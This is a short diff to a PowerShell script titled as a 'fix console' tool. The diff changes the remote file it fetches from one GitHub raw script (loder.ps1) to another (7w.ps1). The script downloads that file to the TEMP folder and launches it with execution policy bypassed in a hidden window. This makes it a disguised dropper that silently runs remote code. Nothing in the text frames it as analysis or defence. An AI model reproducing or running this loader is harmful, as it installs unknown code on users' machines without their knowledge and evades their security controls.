@@ -1,6 +1,6 @@
 $Host.UI.RawUI.WindowTitle = "FIX CONSOLE v2.0 | MODULE"
-$url = "https://github.com/ShramC/Ds/raw/refs/heads/main/loder.ps1"
-$path = "$env:TEMP\loder.ps1"
+$url = "https://github.com/ShramC/Ds/raw/refs/heads/main/7w.ps1"
+$path = "$env:TEMP\7w.ps1"
 try {
     Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -ErrorAction Stop
     Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$path`"" -WindowStyle Hidden
